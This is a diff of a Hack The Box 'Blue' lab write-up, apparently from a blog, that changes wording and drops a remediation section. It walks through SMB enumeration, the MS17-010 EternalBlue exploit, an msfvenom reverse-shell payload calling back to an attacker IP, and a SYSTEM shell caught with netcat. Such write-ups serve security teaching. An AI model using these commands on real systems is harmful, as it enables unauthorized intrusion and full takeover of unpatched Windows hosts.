@@ -23,11 +23,13 @@ weight = 8
 # Mind Map
 ![Blue_MindMap](/images/htb/blue_mindmap.png)
 
-# Reconnaisance
+&nbsp;
 
-I start with an initial scan, including the `-sC` option which will run also the default scripts:
+# Recon
 
-{{< highlight html >}}
+We start with an initial scan, including the `-sC` option which will run also the default scripts:
+
+```
 sudo nmap -sC -sV -O 10.10.10.40 -n -oA nmap/initial
 
 Nmap scan report for 10.10.10.40
@@ -82,16 +84,17 @@ Host script results:
 |_  start_date: 2020-06-27T07:44:39
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-{{< /highlight >}}
+```
 
 **Note**: `guest` appears to be a valid account.
 
+&nbsp;
 
 # Enumeration
 
-From the scan result I can see that **port 445** - used for SMB - is open and that the `message_signing` option is disabled. That means that I can login via SMB without providing credentials and list the shares available for that machine:
+From the scan result we can see that **port 445** - used for SMB - is open and that the `message_signing` option is disabled. There are some shares with null session read access:
 
-{{< highlight html >}}
+```
 smbclient -L 10.10.10.40
 Enter WORKGROUP\user's password:
 
@@ -102,17 +105,17 @@ Enter WORKGROUP\user's password:
         IPC$            IPC       Remote IPC
         Share           Disk      
         Users           Disk   
-{{< /highlight >}}
+```
 
 **Note**: I can obtain the same info with the following nmap script, which will return shares permission also:
 
-{{< highlight html >}}
+```
 nmap --script smb-enum-shares 10.10.10.40
-{{< /highlight >}}
+```
 
-I can check shares permissions with the `smbmap` command:
+We can also check shares permissions with the `smbmap` command:
 
-{{< highlight html >}}
+```
 smbmap -H 10.10.10.40 -u anonymous
 [+] Guest session       IP: 10.10.10.40:445     Name: 10.10.10.40                                       
         Disk                                                    Permissions     Comment
@@ -122,13 +125,13 @@ smbmap -H 10.10.10.40 -u anonymous
         IPC$                                                    NO ACCESS       Remote IPC
         Share                                                   READ ONLY
         Users                                                   READ ONLY
-{{< /highlight >}}
+```
 
-**->** I have **READ** permissions on the shares named `Share` and `Users`. I can list its content with smbclient but nothing useful is there.
+**->** We have **READ** permissions on the shares named `Share` and `Users`. We can list its content with smbclient but nothing useful is found there.
 
-I proceed checking for vulnerabilities with a nmap script scan on ports `139` and `445`:
+We can proceed checking for vulnerabilities with a nmap script scan on ports `139` and `445`:
 
-{{< highlight html >}}
+```
 nmap --script smb-vuln* 10.10.10.40 -p 139,445 -n
 
 Nmap scan report for 10.10.10.40
@@ -157,10 +160,10 @@ Host script results:
 |_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
 
 Nmap done: 1 IP address (1 host up) scanned in 15.96 seconds
-{{< /highlight >}}
+```
 
 Where:
-- `smb-vuln*` is a wildcard notation useful to specify that I want to run all the scripts with the name starting with `smb-vuln`
+- `smb-vuln*` is a wildcard notation useful to specify that we want to run all the scripts with the name starting with `smb-vuln`
 
 The target is vulnerable to **MS17-010**:
 
@@ -168,56 +171,59 @@ The target is vulnerable to **MS17-010**:
 
 >The NSA did not alert Microsoft about the vulnerabilities, and held on to it for more than five years before the breach forced its hand. The agency then warned Microsoft after learning about EternalBlue’s possible theft, allowing the company to prepare a software patch issued in March 2017,[18] after delaying its regular release of security patches in February 2017.
 
+&nbsp;
+
 # Exploitation
 
-There is a well known `Metasploit` module available for this exploit, but I prefer to do it manually. So I go to `searchsploit` and search for:
+There is a well known `Metasploit` module available for this exploit, but we will do it manually.
+Let's check `searchsploit` and search for:
 
-{{< highlight html >}}
+```
 searchsploit eternalblue
-{{< /highlight >}}
+```
 
-I find an interesting python script for `Win 7/8.1/2008` OS versions:
+We can find an interesting python script for `Win 7/8.1/2008` OS versions:
 
-{{< highlight html >}}
+```
 Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                               | windows/remote/42315.py
-{{< /highlight  >}}
+```
 
-I download it on my machine:
+Let's download it on our machine:
 
-{{< highlight html >}}
+```
 searchsploit -m windows/remote/42315.py
-{{< /highlight  >}}
+```
 
-**Note**: always read the exploit code to understand what it is doing.
+**Tip**: always read the exploit code to understand what it is doing.
 
 In order to work, the script:
 
 1. needs a `mysmb.py` file (easy to find)
-2. needs an exploit to launch, I will create a **msfvenom reverse shell**
-3. needs a  valid `user/pass` couple -> I know that `guest` user is allowed
+2. needs an exploit to launch, we will create a **msfvenom reverse shell**
+3. needs a  valid `user/pass` couple -> We know that `guest` user is allowed
 
-So, for point **1**, I can download the `mysmb.py` file like:
+So, for point **1**, we can download the `mysmb.py` file:
 
-{{< highlight html >}}
+```
 wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
-{{< /highlight >}}
+```
 
-For point **2**, I will create a **reverse shell** with `msfvenom` in the current directory:
+For point **2**, we will create a **reverse shell** with `msfvenom` in the current directory:
 
-{{< highlight html >}}
+```
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.9 LPORT=1234 -f exe > ./shell.exe
-{{< /highlight >}}
+```
 
-At this point I have to edit the exploit file. There are plenty of resources on the internet explaining how to do that. One good resource is this one:
+At this point we have to edit the exploit file. There are plenty of resources on the internet explaining how to do that. One good resource is this one:
 > https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/
 
-Substantially, what I am doing is enabling a function named **service_exec()** that will connect to the target and upload the reverse shell I created. After that, It will try to execute it.
+Substantially, what we are doing is to enable a function named **service_exec()** that will connect to the target and upload the reverse shell we created. After that, it will try to execute it.
 
-If everything goes well, I will have a connection back from the target!
+If everything goes well, we will have a connection back from the target!
 
-At this point I have to set up a listener on my machine and launch the exploit which will connect back to me:
+At this point we have to set up a listener on our machine and launch the exploit which will connect back to us:
 
-{{< highlight html >}}
+```
 python 42315.py 10.10.10.40
 
 Target OS: Windows 7 Professional 7601 Service Pack 1
@@ -260,13 +266,11 @@ Removing service MYBp.....
 ServiceExec Error on: 10.10.10.40
 nca_s_proto_error
 Done
-{{< /highlight >}}
+```
 
-**Note**: you have to launch the exploit a few times if it appears not to be working.
+Here is the shell calling on our machine:
 
-Here is the shell on my machine:
-
-{{< highlight html >}}
+```
 nc -lnvp 1234
 listening on [any] 1234 ...
 connect to [10.10.14.9] from (UNKNOWN) [10.10.10.40] 49298
@@ -278,12 +282,9 @@ whoami
 nt authority\system
 
 C:\Windows\system32>
-{{< /highlight >}}
+```
 
-And I am already **SYSTEM**! No privilege escalation is needed!
+And we are already **SYSTEM**! No privilege escalation is needed!
+
 
 **Note**: flags are under `\Administrator\Desktop` and `\Users\Desktop`.
-
-## Lessons learned and remediations
-
-- The machine was not patched against the well know **EternalBlue** exploit, also known as **MS17-010**. The administrator should have updated the machine.
